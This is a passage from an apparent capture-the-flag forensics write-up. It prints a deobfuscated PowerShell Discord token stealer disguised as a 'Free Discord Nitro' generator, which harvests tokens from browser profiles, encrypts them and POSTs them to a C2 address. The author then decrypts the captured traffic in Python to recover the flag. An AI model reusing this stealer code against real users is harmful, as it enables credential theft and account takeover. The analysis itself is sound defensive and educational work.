YZVR0Rkk5QVNaazlXVHVRV1puRm1iaDEwY2xGR0o3bGlJQ1owVGkwVFprOVdia2dDSW1sV1p6eFdaZ0FDSWdvUUQ5SjBRRnBqT2RWR1p2MWtjbGhHY3BOa0w1aEdjaEozWnZSSGM1SjNRdWtIZHBKWGRqVjJVdTBXWjBOWGVUdEZJOUFTWms5V1R1UVdabkZtYmgxMGNsRkdKN0JTS2lJMFFGSlNQbFIyYnRSQ0tnWVdhbE5IYmxCQ0lnQWlDTjAzVVVOa082MFZaazlXVHlWR2F3bDJRdWtIYXdGbWNuOUdkd2xuY0Q1U2UwbG1jMU5XWlQ1U2JsUjNjNU4xV2cwRElsUjJiTjVDWmxkV1l1RldUelZXWWtzSElwSXlVVU5rSTlVR1p2MUdKb0FpWnBWMmNzVkdJZ0FDSUswUWZDWjBRNm9UWGxSMmJOSlhab0JYYUQ1U2VvQlhZeWQyYjBCWGV5TmtMNVJYYXlWM1lsTmxMdFZHZHpsM1ViQlNQZ1VHWnYxa0xrVjJaaDVXWU5OWFpoUnllZ2tpSUNaMFFpMFRaazlXYmtnQ0ltbFdaenhXWmdBQ0lnb1FEOUJ5UUNOa082MFZaazlXVHlWR2F3bDJRdWtIYXdGbWNuOUdkd2xuY0Q1U2UwbG1jMU5XWlQ1U2JsUjNjNU4xV2cwRElsUjJiTjVDWmxkV1l1RldUelZXWWtBeWVna2lJREowUWkwVFprOVdia2dDSW1sR0lnQUNJSzBnQ05JQ1psZFdZdUZXVHpWV1F1a0hhd0ZtY245R2R3bG5jRDVTZTBsbWMxTldaVDVTYmxSM2M1TmxJZ1EzWWxwbVlQMXlkbDVFSTlBQ1psZFdZdUZXVHpWV1lrQUNJZ0FpQ05zSElwVUdadjFHSmd3aVZKUkNJc2tYWnJSQ0swTldacUoyVGtWMlpoNVdZTk5YWkIxU1owRldaeU5FSXU5V2EwTm1iMVptQ05vUUQ5cFFEOUJDSWdBaUNOMDNlZ2cyWTBGMllnQUNJZ0FDSWdBaUNOMEhJZ0FDSWdBQ0lnb1FEbE5uYnZCM2NsSkZKZzRtYzFSWFp5QkNJZ0FDSWdBQ0lnQUNJZ29RRHpKWFprRldaSVJDSXpKWFprRldaSTFDSTBWMlJnUTJib1JYWk4xQ0lwSlhWa0FTYXlWVkxnUTJib1JYWk5SM2NsSlZMbHQyYjI1V1NnMERJbE5uYnZCM2NsSkZKZ0FDSWdBQ0lnQUNJZ0FDSUswZ0NOSVNadEIwTHpKWFp6VjNMNVkzTHBCWFl2MDJiajVDWnk5Mll6bEdadjhpT3pCSGQwaG1JZzBESXBKWFZrQUNJZ0FDSWdBQ0lnQUNJZ29RREswUWZnQUNJZ0FDSWdBQ0lnQUNJSzBnSTJNakwzTVROdmttY2haV1lUQkNPMDRDTjJnakx3NFNNNThTWm5SV1Jna3lick5XWkhCU1pybEdiZ3dDVE5SRlNMaENJMk1qTDNNVE52UVhhTEpXWlhWR2J3QlhRZ2tDTjJnSEk3UWpOdWwyVmdzRE11QVRNZ1FsVGdNM2R2Um1icGRGS2dBakwxOFNZc3hXYTY5V1RpQVNQZ0lDZHVWMlpCMWljbE5YVmlBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FpQ05JaWJ2Tm5hdjQyYnBSWFlqbEdid0JYWWlBU1BnSVNad2xIVnRRbmJsUm5idk5rSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ29RRHVWMmF2UkZKZzBESWk0MmJwUlhZNmxtY3ZoR2QxRmtJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnb1FEN0JFSTlBeWN5VkdaaFZHU2tBQ0lnQUNJZ0FDSWdBQ0lnb1FEN0JTZXlSSElnQUNJZ0FDSWdvUUQ3QnljelYyWXZKSGNnQUNJZ29RREswUUtnQUNJZ29RRHVWMmF2UkZKZGRtYnBKSGR6dEZJZ0FDSWdBQ0lnb1FEZGxTWjFKSGRrQVNQZ2tuY3ZSWFlrNVdZTmhpY2xSWFp0Rm1jaEIxV2dBQ0lnQUNJZ0FpQ05nQ0l0Rm1jaEJGSWdBQ0lLMFFYcGd5WnVsR1p1bG1RMFZHYmsxMlFiQkNJZ0FpQ05zSEl2Wm1iSkpYWnpWRlp5OTJZemxHUnRRWFpIQmlidmxHZGo1V2RtcFFESzBRZkswd2NsUjJialJDSXVKWGQwVm1jZ0FDSWdvUURLMFFmZ0FDSWdvUURsUjJialJDSTlzQ0l6Vkdadk5HSmdBQ0lnQUNJZ0FpQ05rU2Zna0NLNUZtY3lGa2NoaDJRdlJsTHpKWFlvTkdKZ1EzWWxwbVlQUlhkdzVXU3RBU2J2Um1iaEpWTDBWMlJnc0hJME5XWnFKMlR0ZzJZaFZrY3ZaRUk4QkNhMGRtYmx4VVprOTJZazRpTHhnQ0l1bDJicTFDSTlBU1prOTJZa0FDSWdBQ0lnQUNJSzB3ZWdreUtya0dKZ3N6Y2xSMmJEWjJUeVZtWXRWbmJrQUNkczFDSXBSQ0k3QURJOUFTYWtnQ0l5OW1aZ0FDSWdvUURLMFFLb0FFSTlBeWNsUjJialJDSWdBQ0lLMHdKNWd6TjJVRE56SVRNd29YZTRkbmQxUjNjeUZIY3Y1V2JzdG1hcGgyWm1WR1pqSldZYWxGV1haVlZVTmxVUkIxVE8xRVRMcFVTSWRrUkZSMFFDRjBKZzBESXpKWFlvTkdKZ0FDSWdvUURLMFFLZ0FDSWdvUUQyRURJOUFDYTBkbWJseFVaazkyWWswRmR1bDJXZ0FDSWdBQ0lnQWlDTndDTXhBU1BnTVhaazkyUW05a2NsSldiMTVHSmRSbmJwdEZJZ0FDSWdBQ0lnb1FEb0FTYmhKWFl3QkNJZ0FpQ05zSEl6Vkdadk4wYnlSWGFPUm1jdk4yY3BSVVowRm1jbDVXWkhCaWJ2bEdkajVXZG1wUURLMFFmSzB3Y3VWMmF2UkhKZzRtYzFSWFp5QkNJZ0FpQ05vUUQ5dEhJb05HZGhOR0k5QkNJZ0FpQ04wSElnQUNJZ0FDSWdvUUQ5dEhJb05HZGhOR0k5QkNJZ0FDSWdBQ0lnQUNJZ29RRDlCQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FpQ04wSElnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnb1FEbFZIYmhabEx6VkdhalJYWU41eVhrQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdvUUQ3QkNkalZtYWk5VUxvTldZRkozYkdCQ2ZnTVhab05HZGgxRWJzRlVMZ2dYWm5WbWNrQWlieVZHZDBGR1V0QXladWxtYzBOVkwwTldac1YyVWd3SEkwNVdaMDUyYkRWR2JwWkdKZzB6S2dNbmJsdDJiMFJDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdvUUQ3QlNLcGNTZjFrREx3Z3plZDF5ZGN0bExjRm1adGRDSXNjU2Z3RVRNc1VqTTcxVkwzeDFXdXdWZjJzWFh0Y0hYYjVDWDlaak03MVZMM3gxV25nQ1FnNFdhZ2dYWm5WbWNrZ0NJb05XWWxKM2JtQkNJZ0FDSWdBQ0lnQUNJZ0FDSWdBaUNOb1FEdzlHZFRCaWJ2bEdkakZrY3ZKbmNGMUNJM0ZtVXRBU1p0Rm1Uc3hXZEc1eVhrQUNhMEZHVXRBQ2R1VkdkdTkyUXRRWFpIQlNQZ1FuYmxSbmJ2TlVac2xtWmtBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FpQ05zSEk1SkhkZ0FDSWdBQ0lnQUNJZ0FDSUswQUlnQUNJZ0FDSWdBQ0lnQWlDTnNISTBOV1pxSjJUdGcyWWhWa2N2WkVJOEJTWmpKM2JHMUNJbE5uYzFOV1pTMUNJbHhXYUcxQ0lvUlhZd1JDSW9SWFlRMUNJdFZHZEpSR2JwaDJRdFFYWkhCQ0lnQUNJZ0FDSUswd2Vna25jMEJDSWdBaUNOb1FEcGdDUWcwREl6NVdacjlHZGtBQ0lnQWlDTm9RRHBBQ0lnQWlDTmdHZGhCSEpkZG1icEpIZHp0RklnQUNJZ0FDSWdvUURvQVNiaEpYWXdCQ0lnQWlDTnNISXNGV1owTkZJdTlXYTBObWIxWm1DTm9RRGlFR1ozcFdZclJtYXA5bWF4b21jemtET3hvbWN2QURPd2dqTzFNVE11WVRNeDRDTzJFakx5a1RNdjhpT3dSSGRvSkNJOUFDVFNWRko&oeol=%0D)

![fake-boost-2](/assets/images/htb/2024/cyber_apocalypse/fake-boost-2.png)

{::options parse_block_html="true" /}

<details>
<summary markdown="span">deobfuscated.ps1</summary>

```powershell
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
            
            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}


    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

Write-Host "
______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
|  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
                                                                                                         
                                                                                                         "
Write-Host "Generating Discord nitro keys! Please be patient..."

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"

$paths = @{
    'Google Chrome' = "$local\Google\Chrome\User Data\Default"
    'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
    'Opera' = "$roaming\Opera Software\Opera Stable"
    'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
}

$headers = @{
    'Content-Type' = 'application/json'
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
}

$allTokens = @()
foreach ($platform in $paths.Keys) {
    $currentPath = $paths[$platform]

    if (-not (Test-Path $currentPath -PathType Container)) {continue}

    $tokens = Steal -path $currentPath
    $allTokens += $tokens
}

$userInfos = @()
foreach ($token in $allTokens) {
    $userInfo = Get-DiscordUserInfo -Token $token
    if ($userInfo) {
        $userDetails = [PSCustomObject]@{
            ID = $userInfo.id
            Email = $userInfo.email
            GlobalName = $userInfo.global_name
            Token = $token
        }
        $userInfos += $userDetails
    }
}

$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
catch {}

Write-Host "Success! Discord Nitro Keys:"
$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
$keys | ForEach-Object { Write-Output $_ }
```

</details>

{::options parse_block_html="false" /}

`$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"` -> Base64 Decode -> `HTB{fr33_N17r0G3n_3xp053d!_`

Second part of the flag isnt seen anywhere, if we analyze the script it does 2 things:
1. Create fake discord keys
2. Get user discord info and send it to C2 server.

If we follow the http traffic in wireshark we see encrypted payload being sent:

```plaintext
bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==
```

From [AesManaged](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesmanaged.mode?view=net-8.0) docs we know mode defaults to CBC. IV is attached to the encrypted message and AES key is inside the code.

```pwsh
function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData # <--- IV is known from here
    [System.Convert]::ToBase64String($fullData)
}
...
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
```

We can easily decrypt the data using this variables

```py
from Crypto.Cipher import AES
from base64 import b64decode
import json

AES_KEY = b64decode('Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=')
encrypted = 'bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA=='
encrypted = b64decode(encrypted)
iv, payload = encrypted[:16], encrypted[16:]

plaintext = (
    AES.
    new(AES_KEY, AES.MODE_CBC, iv).
    decrypt(payload)
)
plaintext = plaintext.decode().strip('\x05')
plaintext = json.loads(plaintext)
for jsn in plaintext:
    for key, value in jsn.items():
        try:
            decoded = b64decode(value).decode()
            if decoded.isascii():
                print(key, decoded)
        except:
            continue
```

> Flag: HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
{: .prompt-tip }